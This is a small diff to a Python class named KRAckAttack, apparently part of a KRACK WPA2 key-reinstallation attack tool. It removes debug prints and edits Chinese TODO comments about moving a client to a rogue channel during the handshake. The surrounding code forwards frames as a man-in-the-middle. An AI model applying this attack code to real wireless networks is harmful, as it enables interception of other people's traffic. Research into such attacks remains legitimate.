@@ -652,8 +652,6 @@ class KRAckAttack():
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
 			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))
 
-			print('Debug: ', end='')
-			print(might_forward) # !-- 
 			# 需要特別注意 Deauth and Disassoc frames
 			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
 				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
@@ -664,11 +662,10 @@ class KRAckAttack():
 				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
 
 			if might_forward:
-				# Unicast frames to clients
 				if p.addr1 in self.clients:
 					client = self.clients[p.addr1]
-					# !-- CHECK[yes]: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
-					# !-- CHECK[   ]: time out problem?
+					# !-- CHECK[y]: client 要在接收到 msg3 送出 msg4 前，切換到 rogue channel
+					# !-- CHECK[ ]: time out problem?
 					if self.handle_to_client_pairwise(client, p):
 						pass
 					elif self.handle_to_client_groupkey(client, p):
